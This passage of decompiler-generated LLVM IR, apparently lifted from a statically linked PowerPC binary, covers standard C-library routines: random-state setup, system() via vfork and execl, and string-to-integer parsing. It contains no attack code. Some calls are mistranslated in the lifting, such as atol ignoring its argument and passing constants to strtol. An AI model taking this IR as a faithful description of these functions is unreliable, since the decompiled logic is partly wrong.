dec_label_pc_100107ac:                            ; preds = %dec_label_pc_10010790, %dec_label_pc_100107ac
  %v0_100107b426 = load i32, i32* @r30, align 4
  %v2_100107ac = inttoptr i32 %v0_100107b426 to i32*
  %v3_100107ac = call i32 @__GI_random_r(i32* %v2_100107ac, i32 %v2_100107b8)
  %v0_100107b0 = load i32, i32* @r31, align 4
  %v1_100107b0 = add i32 %v0_100107b0, -1
  store i32 %v1_100107b0, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_100107b0, -1
  br i1 %tmp20, label %dec_label_pc_100107ac, label %dec_label_pc_100107c0

dec_label_pc_100107c0:                            ; preds = %dec_label_pc_10010790, %dec_label_pc_100107ac, %dec_label_pc_1001072c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100107c4

dec_label_pc_100107c4:                            ; preds = %entry, %dec_label_pc_100107c0
  %v0_100107c4 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_100107c0 ]
  store i32 %v0_100106f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_100107c4

; uselistorder directives
  uselistorder i32 %v1_1001078c, { 1, 0 }
  uselistorder i32 %v2_10010788, { 1, 0 }
  uselistorder i32 %v2_1001077c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10010768, { 1, 0 }
  uselistorder i32 %v0_10010750, { 1, 2, 0 }
  uselistorder i32 %v3_10010738, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_100107c4, { 1, 0 }
  uselistorder label %dec_label_pc_100107c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100107ac, { 1, 0 }
  uselistorder label %dec_label_pc_10010790, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10010788, { 1, 0 }
  uselistorder label %dec_label_pc_10010768, { 1, 0 }
  uselistorder label %dec_label_pc_1001072c, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_100107dc = icmp ugt i32 %arg2, 127
  %v0_100107e4 = load i32, i32* @lr, align 4
  store i32 %v0_100107e4, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_100107f0 = sub i32 255, %arg2
  %v2_100107f0 = sub i32 -1, %arg2
  %not.v5_100107f0 = icmp ugt i32 %v1_100107f0, %v2_100107f0
  %v6_100107f4 = sext i1 %not.v5_100107f0 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_100107fc = add i32 %tmp, 4
  store i32 %v1_100107fc, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10017db8.672 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_10010814 = sub nsw i32 3, %v6_100107f4
  store i32 %v1_10010814, i32* @r31, align 4
  br i1 %v2_100107dc, label %dec_label_pc_1001083c, label %dec_label_pc_1001081c

dec_label_pc_1001081c:                            ; preds = %entry
  %v2_10010808 = icmp ugt i32 %arg2, 31
  %v1_1001081c = sub i32 63, %arg2
  %not.v5_1001081c = icmp ugt i32 %v1_1001081c, %v2_100107f0
  %v6_10010820 = sext i1 %not.v5_1001081c to i32
  %v1_10010828 = sub nsw i32 1, %v6_10010820
  store i32 %v1_10010828, i32* @r31, align 4
  br i1 %v2_10010808, label %dec_label_pc_1001083c, label %dec_label_pc_10010830

dec_label_pc_10010830:                            ; preds = %dec_label_pc_1001081c
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1001089c, label %dec_label_pc_1001083c

dec_label_pc_1001083c:                            ; preds = %dec_label_pc_10010830, %dec_label_pc_1001081c, %entry
  %v0_1001083c = phi i32 [ 0, %dec_label_pc_10010830 ], [ %v1_10010828, %dec_label_pc_1001081c ], [ %v1_10010814, %entry ]
  %v1_1001083c = mul nsw i32 %v0_1001083c, 4
  store i32 %v1_1001083c, i32* %r0.global-to-local, align 4
  %v2_10010840 = add i32 %arg3, 12
  %v3_10010840 = inttoptr i32 %v2_10010840 to i32*
  store i32 %v0_1001083c, i32* %v3_10010840, align 4
  %v0_10010844 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010844 = load i32, i32* %r11.global-to-local, align 4
  %v2_10010844 = add i32 %v1_10010844, %v0_10010844
  store i32 %v2_10010844, i32* %r9.global-to-local, align 4
  %v3_10010848 = inttoptr i32 %v2_10010844 to i32*
  %v4_10010848 = load i32, i32* %v3_10010848, align 4
  store i32 %v4_10010848, i32* %r0.global-to-local, align 4
  %v1_1001084c = add i32 %v2_10010844, 20
  %v2_1001084c = inttoptr i32 %v1_1001084c to i32*
  %v3_1001084c = load i32, i32* %v2_1001084c, align 4
  store i32 %v3_1001084c, i32* %r9.global-to-local, align 4
  %v1_10010850 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010850 = add i32 %v1_10010850, 20
  %v3_10010850 = inttoptr i32 %v2_10010850 to i32*
  store i32 %v4_10010848, i32* %v3_10010850, align 4
  %v0_10010854 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010854 = mul i32 %v0_10010854, 4
  store i32 %v1_10010854, i32* %r0.global-to-local, align 4
  %v0_10010858 = load i32, i32* %r29.global-to-local, align 4
  %v1_10010858 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010858 = add i32 %v1_10010858, 8
  %v3_10010858 = inttoptr i32 %v2_10010858 to i32*
  store i32 %v0_10010858, i32* %v3_10010858, align 4
  %v0_1001085c = load i32, i32* %r29.global-to-local, align 4
  %v1_1001085c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001085c = add i32 %v1_1001085c, %v0_1001085c
  store i32 %v2_1001085c, i32* %r0.global-to-local, align 4
  %v0_10010860 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010860 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010860 = add i32 %v1_10010860, 16
  %v3_10010860 = inttoptr i32 %v2_10010860 to i32*
  store i32 %v0_10010860, i32* %v3_10010860, align 4
  %v0_10010864 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010864 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010864 = add i32 %v1_10010864, 24
  %v3_10010864 = inttoptr i32 %v2_10010864 to i32*
  store i32 %v0_10010864, i32* %v3_10010864, align 4
  store i32 268503148, i32* @lr, align 4
  %v0_10010868 = call i32 @srandom_r()
  %v0_1001086c = load i32, i32* @r31, align 4
  %v3_1001086c = icmp eq i32 %v0_1001086c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10010878 = load i32, i32* %r27.global-to-local, align 4
  %v2_10010878 = inttoptr i32 %v1_10010878 to i32*
  store i32 0, i32* %v2_10010878, align 4
  br i1 %v3_1001086c, label %dec_label_pc_100108b0, label %dec_label_pc_10010880

dec_label_pc_10010880:                            ; preds = %dec_label_pc_1001083c
  %v0_10010880 = load i32, i32* @r30, align 4
  %v1_10010880 = add i32 %v0_10010880, 4
  %v2_10010880 = inttoptr i32 %v1_10010880 to i32*
  %v3_10010880 = load i32, i32* %v2_10010880, align 4
  %v0_10010884 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010884 = sub i32 %v3_10010880, %v0_10010884
  %v4_10010888 = sdiv i32 %v2_10010884, 4
  %v1_1001088c = mul i32 %v4_10010888, 5
  %v1_10010890 = load i32, i32* @r31, align 4
  %v2_10010890 = add i32 %v1_1001088c, %v1_10010890
  store i32 %v2_10010890, i32* %r0.global-to-local, align 4
  %v1_10010894 = load i32, i32* %r27.global-to-local, align 4
  %v2_10010894 = inttoptr i32 %v1_10010894 to i32*
  store i32 %v2_10010890, i32* %v2_10010894, align 4
  br label %dec_label_pc_100108b0

dec_label_pc_1001089c:                            ; preds = %dec_label_pc_10010830
  %v0_1001089c = call i32 @__errno_location()
  store i32 %v0_1001089c, i32* %r3.global-to-local, align 4
  %v0_100108a0 = load i32, i32* %r28.global-to-local, align 4
  %v2_100108a0 = inttoptr i32 %v0_1001089c to i32*
  store i32 %v0_100108a0, i32* %v2_100108a0, align 4
  %v0_100108a4 = call i32 @__errno_location()
  %v0_100108a8 = load i32, i32* %r28.global-to-local, align 4
  %v2_100108a8 = inttoptr i32 %v0_100108a4 to i32*
  store i32 %v0_100108a8, i32* %v2_100108a8, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100108b0

dec_label_pc_100108b0:                            ; preds = %dec_label_pc_1001083c, %dec_label_pc_10010880, %dec_label_pc_1001089c
  store i32 %v0_100107e4, i32* %r0.global-to-local, align 4
  %v0_100108c0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100108c0

; uselistorder directives
  uselistorder i32 %v2_10010844, { 1, 0, 2 }
  uselistorder i32 %v0_1001083c, { 1, 0 }
  uselistorder i32 %v2_100107f0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10017db8.672 to i32), { 2, 1, 0, 3 }
  uselistorder i32 268500992, { 42, 46, 0, 43, 44, 6, 7, 8, 9, 10, 11, 12, 5, 13, 2, 1, 14, 19, 18, 20, 21, 17, 22, 23, 16, 24, 15, 25, 26, 27, 28, 29, 30, 31, 3, 4, 32, 33, 34, 35, 36, 37, 38, 45, 39, 40, 41 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 4, 2, 0, 5, 3 }
  uselistorder label %dec_label_pc_100108b0, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_100108cc = load i32, i32* @r31, align 4
  %v3_100108d4 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_100108d4, label %dec_label_pc_10010a04, label %dec_label_pc_100108e4

dec_label_pc_100108e4:                            ; preds = %entry
  store i32 268503280, i32* @lr, align 4
  %v2_100108ec = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268503296, i32* @lr, align 4
  %v2_100108fc = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268503312, i32* @lr, align 4
  %v2_1001090c = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_1001090c, i32* @r3, align 4
  store i32 268503320, i32* @lr, align 4
  %v0_10010914 = call i32 @__vfork()
  store i32 %v0_10010914, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v0_10010914, -1
  br i1 %tmp10, label %dec_label_pc_1001094c, label %dec_label_pc_10010920

dec_label_pc_10010920:                            ; preds = %dec_label_pc_100108e4
  store i32 268503340, i32* @lr, align 4
  %v2_10010928 = call i32 @__bsd_signal(i32 3, i32 %v2_100108ec)
  store i32 268503352, i32* @lr, align 4
  %v2_10010934 = call i32 @__bsd_signal(i32 2, i32 %v2_100108fc)
  store i32 268503364, i32* @lr, align 4
  %v2_10010940 = call i32 @__bsd_signal(i32 17, i32 %v2_1001090c)
  br label %dec_label_pc_10010a04

dec_label_pc_1001094c:                            ; preds = %dec_label_pc_100108e4
  %v3_10010918 = icmp eq i32 %v0_10010914, 0
  br i1 %v3_10010918, label %dec_label_pc_10010950, label %dec_label_pc_100109a4

dec_label_pc_10010950:                            ; preds = %dec_label_pc_1001094c
  store i32 268503388, i32* @lr, align 4
  %v2_10010958 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268503400, i32* @lr, align 4
  %v2_10010964 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268503412, i32* @lr, align 4
  %v2_10010970 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_10010998 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10017de0.674 to i32), i32 ptrtoint ([3 x i8]* @global_var_10017de8.675 to i32), i32 ptrtoint ([3 x i8]* @global_var_10017dec.676 to i32), i32 %arg1, i32 0)
  %v1_100109a0 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100109a4

dec_label_pc_100109a4:                            ; preds = %dec_label_pc_1001094c, %dec_label_pc_10010950
  store i32 268503472, i32* @lr, align 4
  %v2_100109ac = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268503484, i32* @lr, align 4
  %v2_100109b8 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_100109bc = load i32, i32* @r31, align 4
  store i32 268503504, i32* @lr, align 4
  %v4_100109cc = call i32 @wait4(i32 %v0_100109bc)
  %v3_100109d0 = icmp eq i32 %v4_100109cc, -1
  br i1 %v3_100109d0, label %dec_label_pc_100109d8, label %dec_label_pc_100109dc

dec_label_pc_100109d8:                            ; preds = %dec_label_pc_100109a4
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_100109dc

dec_label_pc_100109dc:                            ; preds = %dec_label_pc_100109a4, %dec_label_pc_100109d8
  store i32 268503528, i32* @lr, align 4
  %v2_100109e4 = call i32 @__bsd_signal(i32 3, i32 %v2_100108ec)
  store i32 268503540, i32* @lr, align 4
  %v2_100109f0 = call i32 @__bsd_signal(i32 2, i32 %v2_100108fc)
  store i32 268503552, i32* @lr, align 4
  %v2_100109fc = call i32 @__bsd_signal(i32 17, i32 %v2_1001090c)
  %v3_10010a00 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10010a04

dec_label_pc_10010a04:                            ; preds = %entry, %dec_label_pc_10010920, %dec_label_pc_100109dc
  %v0_10010a14 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_10010920 ], [ %v3_10010a00, %dec_label_pc_100109dc ]
  store i32 %v0_100108cc, i32* @r31, align 4
  ret i32 %v0_10010a14

; uselistorder directives
  uselistorder i32 %v0_10010914, { 1, 0, 2 }
  uselistorder i32 %v2_1001090c, { 1, 0, 2 }
  uselistorder i32 %v2_100108fc, { 1, 0 }
  uselistorder i32 %v2_100108ec, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10010a04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100109dc, { 1, 0 }
  uselistorder label %dec_label_pc_100109a4, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_10010a20 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_10010a20
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_10010a28 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_10010a28
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10010a3c = load i32, i32* @r4, align 4
  store i32 %v0_10010a3c, i32* @r25, align 4
  %v0_10010a44 = load i32, i32* @r5, align 4
  store i32 %v0_10010a44, i32* %r30.global-to-local, align 4
  %v0_10010a48 = load i32, i32* @r6, align 4
  store i32 %v0_10010a48, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_10010a50 = load i32, i32* @global_var_10028798, align 4
  br label %dec_label_pc_10010a5c

dec_label_pc_10010a58:                            ; preds = %dec_label_pc_10010a5c
  %v1_10010a58 = add i32 %v0_10010a90, 1
  store i32 %v1_10010a58, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010a5c

dec_label_pc_10010a5c:                            ; preds = %entry, %dec_label_pc_10010a58
  %v0_10010a90 = phi i32 [ %tmp, %entry ], [ %v1_10010a58, %dec_label_pc_10010a58 ]
  %v1_10010a5c = inttoptr i32 %v0_10010a90 to i8*
  %v2_10010a5c = load i8, i8* %v1_10010a5c, align 1
  %v3_10010a5c = zext i8 %v2_10010a5c to i32
  %v1_10010a60 = mul nuw nsw i32 %v3_10010a5c, 2
  %v2_10010a64 = add i32 %v1_10010a60, %v3_10010a50
  %v3_10010a64 = inttoptr i32 %v2_10010a64 to i16*
  %v4_10010a64 = load i16, i16* %v3_10010a64, align 2
  %v1_10010a68 = and i16 %v4_10010a64, 32
  %v3_10010a68 = icmp eq i16 %v1_10010a68, 0
  br i1 %v3_10010a68, label %dec_label_pc_10010a70, label %dec_label_pc_10010a58

dec_label_pc_10010a70:                            ; preds = %dec_label_pc_10010a5c
  %v3_10010a70 = icmp eq i8 %v2_10010a5c, 43
  br i1 %v3_10010a70, label %dec_label_pc_10010a90, label %dec_label_pc_10010a78

dec_label_pc_10010a78:                            ; preds = %dec_label_pc_10010a70
  %v3_10010a78 = icmp eq i8 %v2_10010a5c, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_10010a78, label %dec_label_pc_10010a90, label %dec_label_pc_10010a94

dec_label_pc_10010a90:                            ; preds = %dec_label_pc_10010a70, %dec_label_pc_10010a78
  %storemerge = phi i32 [ 1, %dec_label_pc_10010a78 ], [ 0, %dec_label_pc_10010a70 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_10010a90 = add i32 %v0_10010a90, 1
  store i32 %v1_10010a90, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010a94

dec_label_pc_10010a94:                            ; preds = %dec_label_pc_10010a78, %dec_label_pc_10010a90
  %v1_10010a94 = call i32 @__asm_rlwinm.(i32 %v0_10010a44, i32 0, i32 28, i32 26)
  %v4_10010a94 = icmp eq i32 %v1_10010a94, 0
  br i1 %v4_10010a94, label %dec_label_pc_10010aa0, label %dec_label_pc_10010a94.dec_label_pc_10010adc_crit_edge

dec_label_pc_10010a94.dec_label_pc_10010adc_crit_edge: ; preds = %dec_label_pc_10010a94
  %v0_10010adc.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010adc

dec_label_pc_10010aa0:                            ; preds = %dec_label_pc_10010a94
  %v0_10010aa0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010aa0 = inttoptr i32 %v0_10010aa0 to i8*
  %v2_10010aa0 = load i8, i8* %v1_10010aa0, align 1
  %v0_10010aa4 = load i32, i32* %r30.global-to-local, align 4
  %v1_10010aa4 = add i32 %v0_10010aa4, 10
  store i32 %v1_10010aa4, i32* %r30.global-to-local, align 4
  %v3_10010aa8 = icmp eq i8 %v2_10010aa0, 48
  br i1 %v3_10010aa8, label %dec_label_pc_10010ab0, label %dec_label_pc_10010ad0

dec_label_pc_10010ab0:                            ; preds = %dec_label_pc_10010aa0
  %v1_10010ab0 = add i32 %v0_10010aa0, 1
  %v2_10010ab0 = inttoptr i32 %v1_10010ab0 to i8*
  %v3_10010ab0 = load i8, i8* %v2_10010ab0, align 1
  %v4_10010ab0 = zext i8 %v3_10010ab0 to i32
  store i32 %v1_10010ab0, i32* %r31.global-to-local, align 4
  %v1_10010ab4 = add i32 %v0_10010aa4, 8
  store i32 %v1_10010ab4, i32* %r30.global-to-local, align 4
  %v1_10010ab8 = or i32 %v4_10010ab0, 32
  %v3_10010ac0 = icmp eq i32 %v1_10010ab8, 120
  br i1 %v3_10010ac0, label %dec_label_pc_10010ac8, label %dec_label_pc_10010ad0

dec_label_pc_10010ac8:                            ; preds = %dec_label_pc_10010ab0
  %v1_10010ac8 = mul i32 %v1_10010ab4, 2
  store i32 %v1_10010ac8, i32* %r30.global-to-local, align 4
  %v1_10010acc = add i32 %v0_10010aa0, 2
  store i32 %v1_10010acc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010ad0

dec_label_pc_10010ad0:                            ; preds = %dec_label_pc_10010ab0, %dec_label_pc_10010aa0, %dec_label_pc_10010ac8
  %v0_10010b8415 = phi i32 [ %v1_10010ab0, %dec_label_pc_10010ac8 ], [ %tmp, %dec_label_pc_10010aa0 ], [ %v1_10010ab0, %dec_label_pc_10010ab0 ]
  %v0_10010ad0 = phi i32 [ %v1_10010ac8, %dec_label_pc_10010ac8 ], [ %v1_10010aa4, %dec_label_pc_10010aa0 ], [ %v1_10010ab4, %dec_label_pc_10010ab0 ]
  %tmp22 = icmp slt i32 %v0_10010ad0, 17
  br i1 %tmp22, label %dec_label_pc_10010adc, label %dec_label_pc_10010ad8

dec_label_pc_10010ad8:                            ; preds = %dec_label_pc_10010ad0
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010adc

dec_label_pc_10010adc:                            ; preds = %dec_label_pc_10010a94.dec_label_pc_10010adc_crit_edge, %dec_label_pc_10010ad0, %dec_label_pc_10010ad8
  %v0_10010b8414 = phi i32 [ %tmp, %dec_label_pc_10010a94.dec_label_pc_10010adc_crit_edge ], [ %v0_10010b8415, %dec_label_pc_10010ad0 ], [ %v0_10010b8415, %dec_label_pc_10010ad8 ]
  %v1_10010af0 = phi i32 [ %v0_10010adc.pre, %dec_label_pc_10010a94.dec_label_pc_10010adc_crit_edge ], [ %v0_10010ad0, %dec_label_pc_10010ad0 ], [ 16, %dec_label_pc_10010ad8 ]
  %v1_10010adc = add i32 %v1_10010af0, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_10010ae4 = icmp ugt i32 %v1_10010adc, 34
  br i1 %v2_10010ae4, label %dec_label_pc_10010b7c, label %dec_label_pc_10010aec

dec_label_pc_10010aec:                            ; preds = %dec_label_pc_10010adc
  %v2_10010af0 = udiv i32 -1, %v1_10010af0
  store i32 %v2_10010af0, i32* @r29, align 4
  %v2_10010af4 = mul i32 %v2_10010af0, %v1_10010af0
  %v1_10010af8 = sub i32 -1, %v2_10010af4
  %v1_10010afc = urem i32 %v1_10010af8, 256
  store i32 %v1_10010afc, i32* @r27, align 4
  %v0_10010b08.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010b08

dec_label_pc_10010b04:                            ; preds = %dec_label_pc_10010b70, %dec_label_pc_10010b58
  %v1_10010b0c.pre = phi i32 [ %v1_10010b10, %dec_label_pc_10010b70 ], [ %v1_10010b0c.pre.pre, %dec_label_pc_10010b58 ]
  %v0_10010b0c.pre = phi i32 [ %v2_10010b74, %dec_label_pc_10010b70 ], [ %v0_10010b0c.pre.pre, %dec_label_pc_10010b58 ]
  %v0_10010b04 = phi i32 [ %v1_10010b14, %dec_label_pc_10010b70 ], [ %v0_10010b04.pre, %dec_label_pc_10010b58 ]
  br label %dec_label_pc_10010b08

dec_label_pc_10010b08:                            ; preds = %dec_label_pc_10010aec, %dec_label_pc_10010b04
  %v0_10010b8412 = phi i32 [ %v0_10010b8414, %dec_label_pc_10010aec ], [ %v0_10010b04, %dec_label_pc_10010b04 ]
  %v0_10010b14 = phi i32 [ %v0_10010b08.pre, %dec_label_pc_10010aec ], [ %v0_10010b04, %dec_label_pc_10010b04 ]
  %v1_10010b10 = phi i32 [ %v2_10010af0, %dec_label_pc_10010aec ], [ %v1_10010b0c.pre, %dec_label_pc_10010b04 ]
  %v0_10010b70 = phi i32 [ 0, %dec_label_pc_10010aec ], [ %v0_10010b0c.pre, %dec_label_pc_10010b04 ]
  %v1_10010b08 = inttoptr i32 %v0_10010b14 to i8*
  %v2_10010b08 = load i8, i8* %v1_10010b08, align 1
  %v3_10010b08 = zext i8 %v2_10010b08 to i32
  %v3_10010b0c = icmp ugt i32 %v0_10010b70, %v1_10010b10
  %v1_10010b14 = add i32 %v0_10010b14, 1
  store i32 %v1_10010b14, i32* %r31.global-to-local, align 4
  %v1_10010b18 = add nsw i32 %v3_10010b08, -48
  %v1_10010b1c = or i32 %v3_10010b08, 32
  %v1_10010b20 = urem i32 %v1_10010b18, 256
  %tmp23 = icmp ult i32 %v1_10010b20, 10
  br i1 %tmp23, label %dec_label_pc_10010b40, label %dec_label_pc_10010b30

dec_label_pc_10010b30:                            ; preds = %dec_label_pc_10010b08
  %tmp24 = icmp ult i32 %v1_10010b1c, 97
  br i1 %tmp24, label %dec_label_pc_10010b40, label %dec_label_pc_10010b3c

dec_label_pc_10010b3c:                            ; preds = %dec_label_pc_10010b30
  %v1_10010b30 = add nsw i32 %v1_10010b1c, -87
  %v1_10010b3c = urem i32 %v1_10010b30, 256
  br label %dec_label_pc_10010b40

dec_label_pc_10010b40:                            ; preds = %dec_label_pc_10010b30, %dec_label_pc_10010b08, %dec_label_pc_10010b3c
  %v1_10010b74 = phi i32 [ 40, %dec_label_pc_10010b30 ], [ %v1_10010b20, %dec_label_pc_10010b08 ], [ %v1_10010b3c, %dec_label_pc_10010b3c ]
  %v1_10010b40 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010b40 = icmp slt i32 %v1_10010b74, %v1_10010b40
  br i1 %v2_10010b40, label %dec_label_pc_10010b48, label %dec_label_pc_10010b7c

dec_label_pc_10010b48:                            ; preds = %dec_label_pc_10010b40
  br i1 %v3_10010b0c, label %dec_label_pc_10010b58, label %dec_label_pc_10010b4c

dec_label_pc_10010b4c:                            ; preds = %dec_label_pc_10010b48
  %v1_10010b4c = load i32, i32* @r27, align 4
  %v0_10010b50.not = icmp ne i32 %v0_10010b70, %v1_10010b10
  %tmp25 = icmp ule i32 %v1_10010b74, %v1_10010b4c
  %or.cond = or i1 %tmp25, %v0_10010b50.not
  br i1 %or.cond, label %dec_label_pc_10010b70, label %dec_label_pc_10010b58

dec_label_pc_10010b58:                            ; preds = %dec_label_pc_10010b4c, %dec_label_pc_10010b48
  %v0_10010b58 = call i32 @__errno_location()
  %v0_10010b5c = load i32, i32* @r28, align 4
  %v1_10010b5c = load i32, i32* @r26, align 4
  %v2_10010b5c = and i32 %v1_10010b5c, %v0_10010b5c
  store i32 %v2_10010b5c, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_10010b68 = inttoptr i32 %v0_10010b58 to i32*
  store i32 34, i32* %v2_10010b68, align 4
  %v0_10010b04.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10010b0c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10010b0c.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010b04

dec_label_pc_10010b70:                            ; preds = %dec_label_pc_10010b4c
  %v2_10010b70 = mul i32 %v1_10010b40, %v0_10010b70
  %v2_10010b74 = add i32 %v2_10010b70, %v1_10010b74
  store i32 %v2_10010b74, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010b04

dec_label_pc_10010b7c:                            ; preds = %dec_label_pc_10010b40, %dec_label_pc_10010adc
  %v0_10010b84 = phi i32 [ %v0_10010b8414, %dec_label_pc_10010adc ], [ %v0_10010b8412, %dec_label_pc_10010b40 ]
  %v0_10010b7c = load i32, i32* @r25, align 4
  %v3_10010b7c = icmp eq i32 %v0_10010b7c, 0
  br i1 %v3_10010b7c, label %dec_label_pc_10010b88, label %dec_label_pc_10010b84

dec_label_pc_10010b84:                            ; preds = %dec_label_pc_10010b7c
  %v2_10010b84 = inttoptr i32 %v0_10010b7c to i32*
  store i32 %v0_10010b84, i32* %v2_10010b84, align 4
  br label %dec_label_pc_10010b88

dec_label_pc_10010b88:                            ; preds = %dec_label_pc_10010b7c, %dec_label_pc_10010b84
  %v0_10010b88 = load i32, i32* @r26, align 4
  %v3_10010b88 = icmp eq i32 %v0_10010b88, 0
  %v0_10010b8c = load i32, i32* @r28, align 4
  %v1_10010b8c = sub i32 0, %v0_10010b8c
  %tmp27 = lshr i32 %v1_10010b8c, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_10010bcc.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_10010b88, label %dec_label_pc_10010bbc, label %dec_label_pc_10010ba4

dec_label_pc_10010ba4:                            ; preds = %dec_label_pc_10010b88
  %v3_10010ba4 = icmp ugt i32 %v0_10010bcc.pre.pre, %tmp28
  br i1 %v3_10010ba4, label %dec_label_pc_10010bac, label %dec_label_pc_10010bbc

dec_label_pc_10010bac:                            ; preds = %dec_label_pc_10010ba4
  %v0_10010bac = call i32 @__errno_location()
  %v2_10010bb4 = inttoptr i32 %v0_10010bac to i32*
  store i32 34, i32* %v2_10010bb4, align 4
  %v0_10010bb8 = load i32, i32* @r31, align 4
  store i32 %v0_10010bb8, i32* %r8.global-to-local, align 4
  %v0_10010bbc.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10010bbc

dec_label_pc_10010bbc:                            ; preds = %dec_label_pc_10010b88, %dec_label_pc_10010ba4, %dec_label_pc_10010bac
  %v0_10010bcc.pre = phi i32 [ %v0_10010bcc.pre.pre, %dec_label_pc_10010ba4 ], [ %v0_10010bb8, %dec_label_pc_10010bac ], [ %v0_10010bcc.pre.pre, %dec_label_pc_10010b88 ]
